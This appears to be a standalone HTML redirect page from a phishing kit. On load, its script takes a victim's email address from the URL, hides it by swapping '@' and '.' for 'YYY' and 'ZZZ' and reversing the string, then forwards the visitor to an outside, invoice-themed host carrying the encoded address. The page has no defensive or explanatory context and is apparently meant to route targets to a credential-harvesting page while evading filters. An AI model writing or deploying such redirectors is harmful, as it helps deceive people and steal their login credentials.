<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Email Redirector</title>
  <script>
    function encodeAndRedirect() {
      const params = new URLSearchParams(window.location.search);
      const email = params.get("e");

      if (email) {
        const encoded = email.replace(/@/g, 'YYY').replace(/\./g, 'ZZZ').split('').reverse().join('');
        const targetUrl = `https://salesinvfiles.vercel.app/?e=${encoded}`;
        window.location.href = targetUrl;
      } else {
        document.body.innerHTML = "<h2>No email parameter found in URL.</h2>";
      }
    }

    window.onload = encodeAndRedirect;
  </script>
</head>
<body>
  <p></p>
</body>
</html>
